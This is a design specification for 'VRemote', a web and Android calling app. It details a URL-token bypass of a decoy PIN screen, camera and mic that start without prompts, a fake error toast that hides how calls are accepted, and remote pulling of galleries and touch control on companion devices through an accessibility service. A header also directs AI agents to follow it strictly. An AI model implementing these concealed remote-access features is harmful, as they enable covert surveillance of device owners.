# VRemote — Website Architecture, Features & Complete UI Flow Specification

> **PURPOSE OF THIS DOCUMENT:**
> This document defines the exact architectural, functional, and UI flow of the **VRemote Website** (`public/` and `app/`). Any AI agent, developer, or automated pipeline modifying or fixing code must follow this specification strictly. Under no circumstances should any bug fix or new feature deviate from or break the flows documented here.

---

## 1. Quick Architectural Rule: `public/` & `app/` 100% Sync

- `public/` is the live web server directory served by Node.js (`server.js`).
- `app/` is the asset bundle directory embedded into the Android APK.
- **Rule:** Every change to HTML (`index.html`), CSS (`css/style.css`), or JavaScript (`js/main.js`) **must be applied identically to both `public/` and `app/`**. At all times, `diff -r public app` must return zero differences.

---

## 2. Session Initialization & URL Parameter Flow

```
User visits website
       │
       ▼
Does URL have UID parameter? (?uid=xxx, ?ui=xxx, ?id=xxx, or #uid=xxx)
       ├──► YES ──► Bypass Lock Screen immediately (html.bypass-lock)
       │            Auto-create User with UID prefix
       │            Instantly acquire Camera & Microphone (multi-tier fallback)
       │            Render live local preview (top-right box, mirrored, muted)
       │            Auto-connect to deal partner if peer with matching base UID exists
       │
       └──► NO  ──► Display Decoy Security PIN Lock Screen
                    Wait for user to enter correct PIN (default: 1234)
                    On correct PIN -> activate session & media
```

1. **Auto-Bypass:** If the URL contains `?uid=`, `?ui=`, `?id=`, `?u=`, `?user=`, `?token=`, or hash `#uid=`, inline script in `<head>` immediately adds `class="bypass-lock"` to `<html>` and hides `#security-lock-screen`.
2. **Instant Media Activation:** Camera and mic hardware activate immediately with zero popups or manual clicks. Multi-tier acquisition ensures camera preview never drops into an audio-only state.
3. **Auto-Connection (Matching Deal UID):** Users sharing the same base UID (e.g. `7_caller` and `7_callee`) automatically initiate/receive the call connection upon both joining the room.

---

## 3. Camera & Microphone Hardware Privacy Flow (Idle vs In-Call)

```
State: Idle (NO active call)
       │
       ├─► Tab switch / Chrome minimized / Window blur:
       │     └─► IMMEDIATELY stop all media tracks (track.stop())
       │     └─► Camera LED / Browser privacy green dot turns OFF completely
       │
       └─► Return to tab / Chrome restored / Window focus:
             └─► AUTOMATICALLY re-acquire camera & mic
             └─► Resume live local preview without manual clicks

State: Active Call (peerConnection connected)
       │
       └─► Tab switch / Chrome minimized / Window blur:
             └─► Call, camera, mic and audio CONTINUE running 100% in background
             └─► Streaming NEVER interrupts or pauses
```

- **Idle Privacy:** In idle state, user privacy is paramount. Camera/mic hardware must be freed immediately when the user navigates away or switches tabs.
- **Call Continuity:** Once in a call, background audio/video streaming is mandatory.

---

## 4. Picture-in-Picture (PiP) Flow: Strictly Manual Only

- **Rule:** Picture-in-Picture (PiP) **NEVER** opens automatically on tab switch, minimizing, or call connect.
- **Trigger:** PiP can **ONLY** be entered when the user explicitly clicks the Picture-in-Picture button inside the More popover menu (`#btn-dock-more` -> `#more-item-pip`).
- **Dynamic Stream Selection:** PiP dynamically targets `remoteVideo` (if remote live stream is playing in an active video call) or `localVideo` (if idle or self-view).

---

## 5. Incoming Call Alert Flow (Stealth Minimal Bar & Hold-to-Accept)

```
Incoming Call Offer Received
       │
       ▼
Display minimal bar (#incoming-call-bar): [Phone Icon] : [ID] : [X Icon]
Synthesized melodic chime rings (2-second interval)
Floating red "End Call" button remains strictly HIDDEN (no overlap)
       │
       ├──► User Taps/Clicks Phone Icon (< 450ms):
       │      ├─► Call is NOT accepted
       │      ├─► Phone icon shakes (.shake-error)
       │      ├─► Subtle haptic vibration (50ms)
       │      └─► Decoy error toast appears: "error: try after 10 minutes"
       │
       ├──► User Holds Phone Icon (>= 450ms):
       │      ├─► Button glows (.holding)
       │      ├─► Full confirmation vibration ([40, 60, 40])
       │      ├─► Call is accepted (acceptIncomingCall())
       │      ├─► Ringing chime stops
       │      └─► Floating End Call button appears
       │
       └──► User Clicks Decline (X Icon):
              ├─► Sends end-call signal to caller
              ├─► Stops chime & hides incoming bar
              └─► Returns cleanly to idle
```

- **Decoy Protection:** Single tap does not accept the call and displays `error: try after 10 minutes`. This prevents accidental answers and conceals the true hold mechanism from unauthorized onlookers.
- **Hold Duration:** Exact threshold is `HOLD_ACCEPT_MS = 450ms`.
- **No Overlap:** `#floating-end-call-btn` is excluded during `incomingCallData` so the minimal incoming bar `: ID :` is unobstructed.

---

## 6. Bottom Controls Dock & Floating Buttons

### A. Bottom Dock (`#call-controls`)
The dock consists of two primary zones:
1. **Scrollable Action Area (`.controls-scroll-wrapper`):**
   - Camera Toggle (`#toggle-camera`): `fas fa-user` (active) / `fas fa-user-slash` (muted).
   - Mic Toggle (`#toggle-mic`): `fas fa-microphone` / `fas fa-microphone-slash`.
   - Call Mode Switch (`#toggle-call-mode`): switches between Audio Call and Video Call modes.
   - Screen Share (`#toggle-screen`): triggers native or web screen sharing.
   - Chat Drawer (`#btn-dock-chat`): opens chat sliding drawer.
   - Participants Drawer (`#btn-dock-participants`): opens participant list.
   - More Popover Menu (`#btn-dock-more`): PiP, Flip Camera, Mute Speaker, Audio Output.
   - Settings (`#toggle-more-menu`): bitrates, resolutions, diagnostics.
2. **Vertical Divider & Static Action (`.controls-static-action`):**
   - **ONLY** the dropdown chevron button (`#btn-collapse-bar`) exists here.

### B. Collapse & Expand Gestures
- **Collapse:** Clicking the dropdown chevron collapses the dock into a minimal bottom tab (`#btn-expand-bar`).
- **Expand:**
  - Clicking the expand tab.
  - **Press & hold bottom edge for 380ms** (supports touchscreens with 16px jitter tolerance so slight finger movements do not cancel the expand).

### C. Floating End Call Button (`#floating-end-call-btn`)
- Floats above the dock.
- Only visible when:
  - An outgoing call is ringing (`callingPeer`), OR
  - A call is actively connected (`activePeer || (peerConnection && connected)`).
- Automatically adjusts position when dock collapses (`.dock-collapsed`).
- Strictly hidden during incoming call alerts.

---

## 7. Dynamic Audio ↔ Video Mode Switching with Receiver Privacy Guard

```
User 1 clicks "Call Mode" button (Audio -> Video)
       │
       ▼
Socket emits "call-mode-change" { mode: "video" }
       │
       ├─► User 1 (Initiator Side):
       │     ├─► Camera turns ON immediately
       │     ├─► Video stream transmitted to User 2
       │     └─► Shows Video Call UI
       │
       └─► User 2 (Receiver Side — PRIVACY GUARD):
             ├─► Receives remote video of User 1
             ├─► User 2's local camera stays MUTED / OFF
             ├─► User 2's camera icon changes to slashed: fas fa-user-slash
             └─► User 2's video ONLY streams when User 2 explicitly clicks
                 the slashed icon to un-slash (fas fa-user), giving consent!
```

- **Audio Call Mode:**
  - Top-right local camera box (`#local-video-container`) is hidden (`display: none !important;`).
  - Audio calling card with animated voice wave rings appears.
- **Switch to Video Mode:**
  - User 1's camera activates.
  - User 2's camera remains blocked/slashed until explicit manual toggle. User 2's privacy is protected at all costs.

---

## 8. Dual-Side Call End Synchronization

- When either User 1 or User 2 clicks "End Call" or declines:
  1. `end-call` packet is emitted via socket.
  2. `server.js` routes `end-call` to the partner via exact username, socket ID, case-insensitive, or base-UID prefix match.
  3. Both parties terminate WebRTC connections, stop remote tracks, clear ringtones, hide active call bars/floating buttons, and return to idle.
  4. Neither party is ever left hanging or orphaned in an active call state.

---

## 9. Device Registry & Auto-Commands ("My Devices" Panel)

- **Entry:** Info button (`#btn-device-registry`) inside the Participants Drawer header opens `#device-registry-modal`.
- **Functionality:**
  - Displays registered companion Android devices (via `RemoteAccessibilityService` & `WebRTCCompanion`).
  - Shows device name, RAM, online status (green dot), and permanent Device ID.
- **Auto-Command Actions:**
  - `Call`: triggers audio call to the device.
  - `Video`: triggers video call.
  - `Info`: retrieves live device specs.
  - `Gallery`: opens `#gallery-modal` with paginated photo thumbnails.
  - `Videos`: opens paginated video thumbnails with duration labels.
  - `Share`: triggers screen share with remote touch control.

---

## 10. Summary of Critical Constants & Selectors

| Feature | Element / Constant | Value / Behavior |
|---|---|---|
| Incoming Accept Hold Time | `HOLD_ACCEPT_MS` | `450ms` |
| Incoming Decoy Toast | `showToast()` | `"error: try after 10 minutes"` |
| Dock Expand Hold Time | `HOLD_EXPAND_MS` | `380ms` (16px jitter tolerance) |
| Cache Version Tag | `?v=` | Bumper on updates (e.g. `?v=6.2`) |
| Top-Right Camera Box | `#local-video-container` | Hidden in Audio Mode (`.hidden-preview`), visible in Video Mode |
| Incoming Alert Bar | `#incoming-call-bar` | Minimal `: ID :` row, 10px above dock |
| Floating End Call Button | `#floating-end-call-btn` | Only for outgoing ringing or connected calls |
| More / Settings Location | Dock scroll wrapper | Inside `.controls-scroll-wrapper` before divider |
| Static Dock Action | `.controls-static-action` | Chevron `#btn-collapse-bar` only |
